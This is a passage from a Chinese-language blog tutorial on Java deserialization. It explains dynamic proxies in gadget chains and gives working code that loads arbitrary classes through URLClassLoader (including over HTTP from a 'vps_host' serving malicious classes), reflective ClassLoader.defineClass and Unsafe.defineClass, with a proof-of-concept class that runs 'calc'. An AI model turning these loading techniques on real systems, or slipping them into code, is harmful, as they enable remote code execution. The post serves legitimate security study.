+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user; <span class="comment">//构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        user.show();</span><br><span class="line">        System.out.println(<span class="string">&quot;经过了Proxy的show（）&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>写一个测试主类 ProxyTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        user.show();</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">userproxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        userproxy.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行ProxyTest.java，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接implement</span><br><span class="line">直接implement</span><br><span class="line">经过了Proxy的show（）</span><br></pre></td></tr></table></figure>
+
+<h3 id="Java-动态代理-例子"><a href="#Java-动态代理-例子" class="headerlink" title="Java 动态代理 例子"></a>Java 动态代理 例子</h3><p>在上一节里，学习了静态代理的思路。但是当存在一系列方法非常相似的接口时，需要把这一系列方法接口全部在代理中实现，非常麻烦。所以引入了动态代理。</p>
+<p>假如在上一个例子的基础上，接口IUser.java变成了这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>相对的，UserImpl.java需要变成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;直接show implement&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;直接create implement&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;直接update implement&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果要按照静态代理的方式，UserProxy.java也要完成新增方法的实现。</p>
+<p>这里使用动态代理。ProxyTest.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        user.show();</span><br><span class="line">        <span class="comment">// 静态代理</span></span><br><span class="line">        <span class="type">IUser</span> <span class="variable">userproxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        userproxy.show();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态代理</span></span><br><span class="line">        <span class="comment">// Proxy.newProxyInstance()接受三个参数，分别为</span></span><br><span class="line">        <span class="comment">// 要代理的接口(此处user.getClass().getInterfaces())</span></span><br><span class="line">        <span class="comment">// 要做的事情(此处userinvocationhandler，即定义的UserInvocationHander.java，继承了InvocationHandler)</span></span><br><span class="line">        <span class="comment">// classloader(此处user.getClass.getClassLoader())</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">userinvocationhandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">userproxydynamic</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),userinvocationhandler);</span><br><span class="line">        userproxydynamic.create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>UserInvocationHandler.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 同时构造了无参构造函数和有参构造函数，更灵活</span></span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 无参构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">        <span class="comment">// 有参构造函数</span></span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在代理&quot;</span>+method.getName());</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">直接show implement</span><br><span class="line">直接show implement</span><br><span class="line">经过了Proxy的show（）</span><br><span class="line">正在代理create</span><br><span class="line">直接create implement</span><br></pre></td></tr></table></figure>
+<p>在使用动态代理的时候，Proxy.newProxyInstance()可以把classInterface变成class数组。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IUser</span> <span class="variable">userproxydynamic</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),userinvocationhandler);</span><br></pre></td></tr></table></figure>
+<p>修改为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IUser</span> <span class="variable">userproxydynamic</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;IUser.class&#125;,</span><br><span class="line">                userinvocationhandler);</span><br></pre></td></tr></table></figure>
+<h4 id="动态代理在反序列化漏洞中的运用"><a href="#动态代理在反序列化漏洞中的运用" class="headerlink" title="动态代理在反序列化漏洞中的运用"></a>动态代理在反序列化漏洞中的运用</h4><p>动态代理作为一种设计模式，可以不修改原有类的同时增加功能，其修改代码较少，适配性较强。</p>
+<ol>
+<li>自动执行：<br>readObject在反序列化时自动执行；<br>invoke在有函数调用时自动执行。</li>
+<li>可以作为一种拼接两条链的方法：（如CC1）<br>出口固定，但是入口可以任意。任意-&gt;固定</li>
+<li>应用场景：</li>
+</ol>
+<ul>
+<li>如，<code>B</code>类的<code>f</code>方法<code>B.f</code>存在漏洞。</li>
+<li>找到了入口<code>A</code>，其接受一个类。<code>A[O]</code>。</li>
+<li>接受这个类后，如果不存在直接的<code>O.f</code>触发漏洞，只有别的方法的调用，如<code>O.abc</code></li>
+<li>这个时候，如果<code>O</code>是一个动态代理类，且其<code>invoke()</code>方法内可以调用<code>f</code>。如，<code>O</code>接受一个<code>O2</code>，<code>O2</code>可以调用<code>f</code>，那么就可以将<code>B</code>传进去做这个<code>O2</code>，那么在<code>invoke()</code>时就可以出发<code>B.f</code>。因为动态代理无论调用什么方法都会调用<code>invoke()</code>。</li>
+<li>利用链：<code>A[O]-&gt;O.abc（此时会调用invoke()）-&gt;B.f</code></li>
+</ul>
+<h2 id="Java-类加载机制和对象创建过程"><a href="#Java-类加载机制和对象创建过程" class="headerlink" title="Java 类加载机制和对象创建过程"></a>Java 类加载机制和对象创建过程</h2><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000023876273">Java类加载机制和对象创建过程</a></p>
+<h3 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h3><ol>
+<li>类加载与反序列化<br>类加载时会执行代码：</li>
+</ol>
+<ul>
+<li>初始化时：静态代码块</li>
+<li>实例化时：构造代码块、无参构造函数。</li>
+</ul>
+<ol start="2">
+<li>动态类加载方法<br><code>Class.forname</code>方法可以动态加载类。</li>
+</ol>
+<p>同时，加载类时可以选择初始化或者不初始化</p>
+<p>如，<code>ClassLoader.loadClass</code>是不进行初始化的一种调用方式。</p>
+<h3 id="URLClassLoader实现任意类加载-file-http-jar"><a href="#URLClassLoader实现任意类加载-file-http-jar" class="headerlink" title="URLClassLoader实现任意类加载 file&#x2F;http&#x2F;jar"></a>URLClassLoader实现任意类加载 file&#x2F;http&#x2F;jar</h3><p>存在敏感应用的类ser.java，将其编译得到class文件。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ser</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编写URLClassLoader进行外部类的加载。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 注意，这里需要写一个URL路径，如果用file://协议，则需要将路径最后加\\，不然会把testdir当成一个大jar包。</span></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///E:\\Caogao\\JavaLearn\\Serialize_Learn\\testdir\\&quot;</span>)&#125;); <span class="comment">// 注意，file://后还有一个/</span></span><br><span class="line">        <span class="comment">// 加载类</span></span><br><span class="line">        Class&lt;?&gt; c = urlClassLoader.loadClass(<span class="string">&quot;ser&quot;</span>);</span><br><span class="line">        <span class="comment">// 实例化类</span></span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功弹计算器。当然，这里的URL也可以是任意其他协议，如<code>http://vps_host:vps_port/malclass_dir/</code>。可以在那个有class文件的路径下开个HTTP服务，<code>python -m http.server 9999</code>，然后用http协议来引入包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:9999/&quot;</span>)&#125;);</span><br></pre></td></tr></table></figure>
+<p>也是一样的。如果加载jar，就<code>jar:file:///dir/xxx.jar!/</code>其中：</p>
+<ul>
+<li>在 jar 包路径后面加上 !，表示 jar 文件的结束</li>
+<li>如果要指定 jar 包中的具体类或资源路径，可以在 ! 后面添加相对路径。</li>
+</ul>
+<h3 id="ClassLoader-defineClass实现字节码加载任意类-（不需出网）"><a href="#ClassLoader-defineClass实现字节码加载任意类-（不需出网）" class="headerlink" title="ClassLoader.defineClass实现字节码加载任意类 （不需出网）"></a>ClassLoader.defineClass实现字节码加载任意类 （不需出网）</h3><p>ClassLoader.defineClass是个protected的方法，所以需要使用反射调用，并设置Accessible为true。ser还是上面那个静态代码块里弹计算器的类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader(); <span class="comment">// 初始化ClassLoader，获取系统类加载器</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class); <span class="comment">// 使用反射获取ClassLoader类中的defineClass方法，该方法用于将字节数组表示的类定义为一个新的 Class 对象。</span></span><br><span class="line">        defineClassMethod.setAccessible(<span class="literal">true</span>); <span class="comment">//protected方法需要设置Accessible可访问</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Caogao\\JavaLearn\\Serialize_Learn\\testdir\\ser.class&quot;</span>)); <span class="comment">//读取本地文件系统中的一个类文件（.class 文件）的字节码内容，并存储在 code 变量中。</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(cl,<span class="string">&quot;ser&quot;</span>,code,<span class="number">0</span>,code.length); <span class="comment">//通过 defineClass 方法将字节数组转换为 Class 对象。参数分别为类名（&quot;ser&quot;）、类的字节数组表示、起始偏移量（0）、数组长度（code.length）。这样就动态加载了一个名为 &quot;ser&quot; 的类。</span></span><br><span class="line">        c.newInstance(); <span class="comment">// 实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Unsafe-defineClass实现字节码加载任意类-（不需出网）"><a href="#Unsafe-defineClass实现字节码加载任意类-（不需出网）" class="headerlink" title="Unsafe.defineClass实现字节码加载任意类 （不需出网）"></a>Unsafe.defineClass实现字节码加载任意类 （不需出网）</h3><p>Unsafe.defineClass字节码加载public类不能直接生成。Unsafe也不能直接调用。其一整个类都是private的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">Unsafe</span><span class="params">()</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>直接运行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unsafe.getUnsafe();</span><br></pre></td></tr></table></figure>
+<p>时，会报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.SecurityException: Unsafe</span><br><span class="line">at sun.misc.Unsafe.getUnsafe(Unsafe.java:90)</span><br><span class="line">at ClassLoaderTest.main(ClassLoaderTest.java:36)</span><br></pre></td></tr></table></figure>
+<p><strong>但是Unsafe在Spring里面可以直接生成加载。</strong></p>
+<p>Unsafe字节码加载任意类：ser还是上面那个静态代码块里弹计算器的类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader(); <span class="comment">// 获取系统类加载器，用于后续加载类。</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Unsafe.class; <span class="comment">// 获取 Unsafe 类的 Class 对象，因为 Unsafe 是一个特殊的类，不会被类加载器加载，所以可以直接使用其类对象。</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>); <span class="comment">// 使用反射获取 Unsafe 类中名为 theUnsafe 的字段，该字段是一个静态字段，存储了 Unsafe 的实例。</span></span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>); <span class="comment">// 将 theUnsafe 字段设置为可访问。</span></span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>); <span class="comment">// 通过 get 方法获取 Unsafe 的实例。</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Caogao\\JavaLearn\\Serialize_Learn\\testdir\\ser.class&quot;</span>)); <span class="comment">//读取本地文件系统中的一个类文件（.class 文件）的字节码内容，并存储在 code 变量中。</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> (Class) unsafe.defineClass(<span class="string">&quot;ser&quot;</span>,code,<span class="number">0</span>,code.length,cl,<span class="literal">null</span>); <span class="comment">//使用 Unsafe 的 defineClass 方法定义一个新的类，并返回一个 Class 对象。参数包括类名（&quot;ser&quot;）、类的字节数组表示、起始偏移量（0）、数组长度（code.length）、类加载器（cl）和保护域（null）。</span></span><br><span class="line">        c2.newInstance(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">Java反序列化学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.1.</span> <span class="toc-text">参考资料</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E6%8E%A5%E5%8F%A3%E5%92%8C%E7%B1%BB%EF%BC%88%E8%BF%99%E6%AE%B5%E5%85%A8%E6%98%AF%E6%91%98%E6%8A%84%E7%9A%84%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">重要接口和类（这段全是摘抄的）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8F%AF%E8%83%BD%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">Java反序列化的可能利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%85%B1%E5%90%8C%E7%9A%84%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">Java反序列化漏洞利用共同的条件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%85%A5%E5%8F%A3%E7%B1%BBreadObject%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">简单案例：入口类readObject直接调用危险方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B2%EF%BC%9A%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%88%E4%BB%A5URLDNS%E9%93%BE%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">案例2：序列化过程中的问题（以URLDNS链为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">反射在反序列化漏洞中的应用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0-ctfshow-web%E5%85%A5%E9%97%A8-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">例题学习: ctfshow-web入门 Java反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web846"><span class="toc-number">2.1.</span> <span class="toc-text">web846</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web847"><span class="toc-number">2.2.</span> <span class="toc-text">web847</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E5%BD%95%E5%92%8C%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">附录和一些基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E5%8F%8D%E5%B0%84"><span class="toc-number">3.1.</span> <span class="toc-text">Java 反射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8F%8D%E5%B0%84-%E6%A6%82%E5%BF%B5-Powered-By-GPT"><span class="toc-number">3.1.1.</span> <span class="toc-text">Java 反射 概念 Powered By GPT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8F%8D%E5%B0%84-%E4%BE%8B%E5%AD%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">Java 反射 例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">Java 动态代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86-%E4%BE%8B%E5%AD%90"><span class="toc-number">3.2.1.</span> <span 